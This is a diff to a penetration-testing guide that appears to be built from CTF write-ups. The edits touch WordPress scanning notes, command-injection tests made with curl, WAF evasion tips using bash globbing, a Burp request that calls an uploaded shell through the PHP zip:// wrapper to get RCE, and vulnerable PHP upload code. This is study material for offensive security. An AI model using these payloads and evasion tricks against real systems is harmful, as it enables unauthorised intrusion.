@@ -466,6 +466,7 @@ Tips
    http://IP/wp-content/plugins/custompluginname
 
 .. Todo:: what is the (standard) format of a wp hash and where in the database is it stored?
+
 **todo: elborate more on wp scanning and vulnerabilities?**
 
 Names? Possible Usernames & Passwords?
@@ -3785,10 +3786,10 @@ Others
 
   ::
 
-   curl -A "bitvijays" -i "http://IPAddress/example?parameter=' whoami'"
+   curl -A "bitvijays" -i "http://IPAddress/example?parameter='linux_command'"
 
   However, it is protected by a WAF, probably, try bash globbling techniques with ? and \*. Refer `Web Application Firewall (WAF) Evasion Techniques <https://medium.com/secjuice/waf-evasion-techniques-718026d693d8>`_ and `Web Application Firewall (WAF) Evasion Techniques #2 <https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0>`_ ! Amazing stuff here!
-  Also, it might be a good idea to test the command with ? on your local machine first then directly on the target.
+  Also, it might be a good idea to test the command with ? on your local machine first then directly on the target. Also, sometimes, it adding a space before or after the linux_command might work like ' linux_command' or 'linux_command '
 
 * Similar to ls there is dir in linux. Try "dir -l" Might be helpful sometimes.
 
@@ -4048,7 +4049,7 @@ Burp Request
 
 ::
 
- GET /?op=zip://uploads/def506bd2176265e006f2db3d7b4e9db11c459c1%23shell HTTP/1.1
+ GET /?parameter=zip://uploads/def506bd2176265e006f2db3d7b4e9db11c459c1%23shell HTTP/1.1
  Host: 10.50.66.93
  User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
 
@@ -4058,11 +4059,9 @@ and we get RCE
 
 ::
 
- home.php
  index.php
  upload.php
  uploads
- view.php
 
 We may read more about it at `Bypassing PHP Null Byte Injection protections – Part II – CTF Write-up <https://www.securusglobal.com/community/2016/08/19/abusing-php-wrappers/>`_ or `CodeGate General CTF 2015: Owlur <https://github.com/ctfs/write-ups-2015/tree/master/codegate-ctf-2015/web/owlur>`_ -- Read other write-ups in this. 
 
@@ -4381,8 +4380,9 @@ Let's also see, serverside code
 
  if(isset($_POST['submit']) && isset($_POST['sinfo'])) {
 	    	$tip = $_POST['sinfo'];
-    		$secretname = genFilename();  ## Generates a random file name
-	    	file_put_contents("uploads/". $client_ip . '/' . $secretname,  $sinfo);
+    		$secretname = Random_Filename();  ## Generates a random file name
+            $location = Random_Number();      ## Generate a random number
+	    	file_put_contents("uploads/". $location . '/' . $secretname,  $sinfo);
 
 If we see, the contents of sinfo are directly put in a file.
 
